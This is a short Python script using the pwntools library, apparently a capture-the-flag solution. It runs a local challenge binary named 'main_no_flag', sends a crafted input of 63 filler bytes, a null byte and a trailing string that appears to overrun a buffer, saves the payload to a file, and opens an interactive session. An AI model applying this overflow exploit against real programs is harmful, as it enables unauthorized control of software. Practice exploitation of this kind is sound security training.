from pwn import *
exe = context.binary = ELF("./main_no_flag")
r = process()
p = b"a" * 63 + b"\x00" + b"pppppppppppping\n"
r.sendline(p)
write("p",p)
r.interactive()